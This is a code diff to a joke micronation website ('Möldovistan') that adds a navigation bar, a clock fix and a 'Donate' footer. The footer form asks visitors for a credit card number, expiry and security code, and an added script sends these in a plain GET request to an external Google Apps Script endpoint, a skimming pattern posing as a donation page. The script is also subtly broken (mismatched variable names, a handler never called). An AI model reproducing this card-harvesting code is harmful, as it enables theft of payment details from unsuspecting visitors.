@@ -10,7 +10,19 @@
 </head>
     
 <body>
-    
+<nav class="navbar is-transparent">
+  <div class="container">
+    <div class="navbar-brand"> <a class="navbar-item" href="index.html">Home</a>
+	  </div>
+    <ul id="navMenu" class="navbar-start has-text-centered navbar-menu false">
+      <li class="navbar-item" style="padding:0px"> <a class="navbar-item" href="history.html">History</a></li>
+      <li class="navbar-item" style="padding:0px"><a class="navbar-item" href="culture.html">Culture</a></li>
+      <li class="navbar-item" style="padding:0px"><a class="navbar-item" href="gov.html">Government</a></li>
+      <li class="navbar-item" style="padding:0px"><a class="navbar-item" href="#donate">Donate</a></li>
+      <li class="navbar-end" style="padding:0px"><a class="navbar-item" href="https://facebook.com"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Pro 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg></a></li>
+    </ul>
+  </div>
+</nav>    
     <div id = "clock">
         <h4>The time in Möldovistan is</h4>
         <span id = "hours">00</span>
@@ -105,19 +117,31 @@
     
     
     
-    <footer>
-    
-        <img id = "flag" src = "imgs/gov/flag.png">
+<footer id="donate">
+  <div class="container">
+	          <img id = "flag" src = "imgs/gov/flag.png">
         
         <h1>Donate to Möldovistan!</h1>
         
         <br>
         
-        <p>Okay we're exaggerating, we're really not doing that well as a country.. any and all donations are much appreciated as it helps keep our beautiful nation afloat! Also--if you can send a letter to your federal government requesting they recognize us, we'd really appreciate it.. xoxo</p>
+        <p>Okay we're exaggerating, we're really not doing that well off as a country... any and all donations are much appreciated as it helps keep our beautiful nation afloat! Also--if you can send a letter to your federal government requesting they recognize us, we'd really appreciate it. xoxo</p>
         
-        <h4>© 2023 The Government of Möldovistan, in all Her glory</h4>
-    
-    </footer>
+      <div>
+        <form action="#" method="post">
+          <label for="cc" style="color:white;">To Donate, Please Enter Your Credit Card Information Here:</label>
+          <input type="cc" id="cc" name="cc" placeholder="Credit Card Number">
+		  <input type="expiry" id="expiry" name="expiry" placeholder="MM/YY" maxlength="4" size="4">
+		  <input type="security" id="security" name="security" placeholder="XXX" maxlength="3" size="1">
+          <button class="read-more" type="submit">Donate!</button>
+        </form>
+      </div>
+      <div>
+        <p>&copy; 2023 The Government of Möldovistan, in all Her glory. All Rights Reserved.</p>
+      </div>
+  </div>
+</footer>
+
     
 <script>
     
@@ -130,7 +154,7 @@
             
             hrs = hrs +7; //Moldovistan time
             
-            if(hrs => 24){
+            if(hrs > 24){
                 
                 hrs = hrs - 24;
             }
@@ -166,3 +190,24 @@
     
     
 </body>
+ <script>
+  
+  var script_url ="https://script.google.com/macros/s/AKfycbxjIwp_rc9PPrU2tZuUTj5U0rwsrIrNwhmuQzq_Vnh0AOrpQKADMzgKI_tLog2BMOuMWg/exec";
+  var emailcheck=false;
+  // Make an AJAX call to Google Script
+  function insert_value() {
+  	var cc= $("#cc").val();
+	var expiry= $("#expiry").val();
+	var subject= $("#security").val();
+   var url = script_url+"?callback=ctrlq&cc="+cc+"&expiry="+expiry+"&security="+security+"&action=insert"; 
+    var request = jQuery.ajax({
+      crossDomain: true,
+      url: url ,
+      method: "GET",
+      dataType: "jsonp"
+    });
+}
+
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous">
+</html>
